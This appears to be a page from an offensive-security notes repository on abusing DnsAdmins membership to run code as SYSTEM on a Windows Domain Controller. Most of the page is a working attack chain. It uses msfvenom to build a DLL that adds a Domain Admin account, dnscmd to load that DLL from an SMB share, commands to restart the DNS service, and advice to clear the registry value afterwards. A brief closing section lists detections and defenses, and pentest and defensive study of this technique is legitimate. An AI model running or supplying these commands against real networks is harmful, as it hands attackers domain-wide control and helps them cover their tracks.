# DnsAdmins

Members of **DnsAdmins** can manage the Microsoft DNS service — and that service (`dns.exe`) runs as **SYSTEM**, often on a **Domain Controller**. The DNS management protocol lets an admin specify a **server-level plugin DLL**; the service loads that DLL on restart with no validation. A DnsAdmins member can therefore point the service at an attacker-controlled DLL on a share, restart the service, and execute code as SYSTEM on the DC — frequently a direct path to Domain Admin.

## Confirm membership

```cmd
whoami /groups | findstr /i "DnsAdmins"
```

## Exploitation

1. Build a malicious DLL (e.g. add a domain admin or spawn a shell):

```bash
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" pwn /add /domain' -f dll -o evil.dll
```

2. Host it on an SMB share the DC can reach, then register it as the DNS server-level plugin:

```cmd
dnscmd <dc-name> /config /serverlevelplugindll \\10.10.14.7\share\evil.dll
```

3. Restart the DNS service to load the DLL as SYSTEM:

```cmd
sc stop dns & sc start dns
```

If you cannot restart the service directly, `wmic`/scheduled maintenance or waiting for a reboot also triggers the load. Clean up the registry value (`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`) afterwards.

## Detection and defenses

- **Detection:** `dnscmd ... /serverlevelplugindll` or writes to the `ServerLevelPluginDll` registry value, `dns.exe` loading a non-Microsoft DLL (Sysmon Event ID 7), DNS service restarts.
- **Defenses:** minimise DnsAdmins membership (treat as tier-0 on DCs); alert on the plugin-DLL registry key; run DNS on non-DC servers where feasible.

## Related
- [Windows Built in Groups](Windows-Built-in-Groups.md) — group overview and escalation map
- [Dynamic Link Library Hijacking(DLL Hijacking)](../Services-Exploitation/Dynamic-Link-Library-Hijacking(DLL-Hijacking).md) — related DLL-load abuse
- Offensive Active Directory — DnsAdmins is typically a DC/Domain-Admin path
- [DLL Injection](../DLL-Injection.md) — injecting code into a running privileged process
